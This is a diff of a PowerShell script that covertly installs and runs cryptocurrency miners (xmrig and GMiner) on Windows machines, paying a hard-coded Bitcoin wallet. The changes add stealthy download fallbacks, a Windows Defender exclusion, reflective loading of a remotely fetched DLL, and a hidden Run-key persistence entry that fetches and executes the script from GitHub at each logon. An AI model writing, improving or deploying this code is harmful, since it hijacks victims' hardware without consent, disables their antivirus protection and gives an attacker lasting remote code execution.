@@ -6,63 +6,104 @@ $GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download
 $Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
 
 $StealthDir = "$env:LOCALAPPDATA\WinSys"
-try { Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue } catch { }
+
+# Robust Fetch Function (Bypasses WebClient restrictions)
+function Get-StealthFile($Url, $Path) {
+    if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
+    
+    # Try Invoke-WebRequest (Modern PS)
+    try {
+        Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
+        if (Test-Path $Path) { return $true }
+    } catch { }
+
+    # Try curl (Standard Win 10/11 process fallback)
+    try {
+        if (Get-Command "curl.exe" -ErrorAction SilentlyContinue) {
+            curl.exe -L -o $Path $Url
+            if (Test-Path $Path) { return $true }
+        }
+    } catch { }
+
+    # Last resort: WebClient (Legacy)
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $wc.DownloadFile($Url, $Path)
+        if (Test-Path $Path) { return $true }
+    } catch { }
+
+    return $false
+}
+
+# 1. Prepare Directory
 if (-not (Test-Path $StealthDir)) {
     New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
 }
 
-$CpuZip = Join-Path $StealthDir "update_c.zip"
-$GpuZip = Join-Path $StealthDir "update_g.zip"
-$CpuExe = Join-Path $StealthDir "WinSys_x.exe"
-$GpuExe = Join-Path $StealthDir "WinSys_g.exe"
-
+# 2. Silent Exclusion (Admin Only Skip)
 try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
+    }
+} catch { }
 
-    if (-not (Test-Path $CpuExe)) {
-        $wc.DownloadFile($MinerUrl, $CpuZip)
+# 3. Setup Paths
+$CpuZip = Join-Path $StealthDir "upd_c.zip"
+$GpuZip = Join-Path $StealthDir "upd_g.zip"
+$CpuExe = Join-Path $StealthDir "WinSystem_x.exe"
+$GpuExe = Join-Path $StealthDir "WinSystem_g.exe"
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# 4. Download and Extract CPU Miner
+if (-not (Test-Path $CpuExe)) {
+    if (Get-StealthFile $MinerUrl $CpuZip) {
         Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
         Remove-Item $CpuZip -Force
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-        Move-Item $Unzipped.FullName -Destination $CpuExe -Force
+        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
     }
+}
 
-    $GpuDetected = $null
-    try {
-        $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
-        if ($vc) {
-             # Detect NVIDIA (VEN_10DE) or AMD (VEN_1002)
-             $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.Name -match "AMD" -or $_.Name -match "Radeon" -or $_.PNPDeviceID -match "VEN_10DE" -or $_.PNPDeviceID -match "VEN_1002" }
-        }
-    } catch { }
+# 5. GPU Detection and Download
+$GpuDetected = $null
+try {
+    $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
+    if ($vc) {
+        $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.Name -match "AMD" -or $_.Name -match "Radeon" -or $_.PNPDeviceID -match "VEN_10DE" -or $_.PNPDeviceID -match "VEN_1002" }
+    }
+} catch { }
 
-    if ($GpuDetected -and -not (Test-Path $GpuExe)) {
-        $wc.DownloadFile($GpuMinerUrl, $GpuZip)
+if ($GpuDetected -and -not (Test-Path $GpuExe)) {
+    if (Get-StealthFile $GpuMinerUrl $GpuZip) {
         Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
         Remove-Item $GpuZip -Force
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
-        Move-Item $Unzipped.FullName -Destination $GpuExe -Force
+        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
     }
+}
 
-    $dllBytes = $wc.DownloadData($DllUrl)
-    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
-    $loader = $assembly.GetType("DateFundLoader")
-    $startMethod = $loader.GetMethod("StartMiner")
-    
-    $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
-    
-    # Invoking the 'Insane' Dynamic Manager
-    $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
-    
-    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $Name = "WinSys"
-    $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
-    Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
-    
-    Write-Host "working"
-
+# 6. Load Bridge DLL and Start
+try {
+    $DllPath = Join-Path $StealthDir "Bridge.dll"
+    if (Get-StealthFile $DllUrl $DllPath) {
+        $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
+        $assembly = [System.Reflection.Assembly]::Load($dllBytes)
+        $loader = $assembly.GetType("DateFundLoader")
+        $startMethod = $loader.GetMethod("StartMiner")
+        
+        $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
+        $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
+        
+        # HKCU Run Registry key (No Admin needed)
+        $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $Name = "WinSys"
+        $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
+        Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
+        
+        Write-Host "working"
+    }
 } catch {
-    Write-Host "CRASHED: $($_.Exception.Message)"
 }
